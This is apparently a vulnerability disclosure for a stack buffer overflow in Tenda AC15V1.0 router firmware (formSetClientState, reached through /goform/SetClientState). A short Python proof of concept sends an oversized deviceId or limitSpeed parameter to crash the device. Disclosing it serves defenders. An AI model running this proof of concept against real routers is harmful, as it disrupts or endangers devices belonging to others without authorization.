## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `formSetClientState` function. The `v9, v11, v10` variable receives the `deviceId, limitSpeed, limitSpeedUp` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `deviceId, limitSpeed, limitSpeedUp` can trigger this security vulnerability.

![image-20240314171612600](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314171612600.png)

![image-20240314171533301](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314171533301.png)

![image-20240314171552572](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314171552572.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetClientState"
payload = b"a"*1000

data = {'limitEn':1,"deviceId": payload}
# data = {'limitEn':1,"limitSpeed": payload}
# data = {'limitEn':1,"limitSpeedUp": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314171654837](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314171654837.png)
